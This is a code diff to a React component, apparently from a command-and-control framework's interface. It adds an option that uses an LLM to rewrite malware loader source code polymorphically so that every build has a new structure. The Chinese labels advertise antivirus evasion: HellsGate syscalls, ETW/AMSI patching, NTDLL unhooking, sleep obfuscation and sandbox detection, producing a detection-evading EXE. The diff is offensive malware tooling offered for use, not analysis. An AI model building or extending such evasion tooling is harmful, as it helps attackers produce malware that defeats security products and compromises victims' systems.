@@ -144,6 +144,7 @@ export function C2AgentBuilder() {
   const [listenerId, setListenerId] = React.useState("");
   const [format, setFormat] = React.useState("amd64_exe");
   const [technique, setTechnique] = React.useState("t1_classic");
+  const [aiPoly, setAiPoly] = React.useState(false);
   const [interval_, setInterval_] = React.useState(5);
   const [jitter, setJitter] = React.useState(20);
   const [result, setResult] = React.useState<{ url: string; filename: string; size: number; sha256: string; server: string } | null>(null);
@@ -188,7 +189,7 @@ export function C2AgentBuilder() {
     if (!listenerId) { setErr("请先选择监听器"); return; }
     setBusy(true); setErr(""); setResult(null);
     try {
-      const { blob, filename } = await api.c2LoaderGenerate({ listener_id: listenerId, technique });
+      const { blob, filename } = await api.c2LoaderGenerate({ listener_id: listenerId, technique, ai_poly: aiPoly && technique !== "t0_drop" });
       const url = URL.createObjectURL(blob);
       setResult({ url, filename, size: blob.size, sha256: "", server: "" });
     } catch (e) {
@@ -253,12 +254,16 @@ export function C2AgentBuilder() {
           <option value="t1_classic">T1 经典：HellsGate + DoubleXOR + IPv4 + ETW/AMSI 补丁 + NTDLL 脱钩</option>
           <option value="t3_sleep">T3 强免杀：+ VEH 保护 + 睡眠混淆 + 深度沙箱检测 + 行为延迟</option>
         </select>
+        <label className="flex items-center gap-2 text-xs text-muted-foreground">
+          <input type="checkbox" checked={aiPoly && technique !== "t0_drop"} disabled={technique === "t0_drop"} onChange={(e) => setAiPoly(e.target.checked)} />
+          {technique === "t0_drop" ? "AI 多态变形仅 shellcode 型（T1/T3）支持——T0 为整 EXE 内嵌，密钥仍每次随机" : "AI 源码级多态变形（LLM 语义保持改写 + 编译验证，每次源码结构全新；+30~90 秒）"}
+        </label>
         <button
           className="flex items-center gap-2 rounded bg-amber-500 px-4 py-2 font-medium text-zinc-950 hover:bg-amber-400 disabled:opacity-40"
           onClick={loaderBuild}
           disabled={busy || listeners.length === 0}
         >
-          <CogIcon className="size-4" /> {busy ? "编译中（首次需下载依赖，约 1-3 分钟）…" : "生成免杀 EXE"}
+          <CogIcon className="size-4" /> {busy ? (aiPoly ? "AI 变形 + 编译中（约 1-3 分钟）…" : "编译中（约 1-3 分钟）…") : "生成免杀 EXE"}
         </button>
       </div>
 
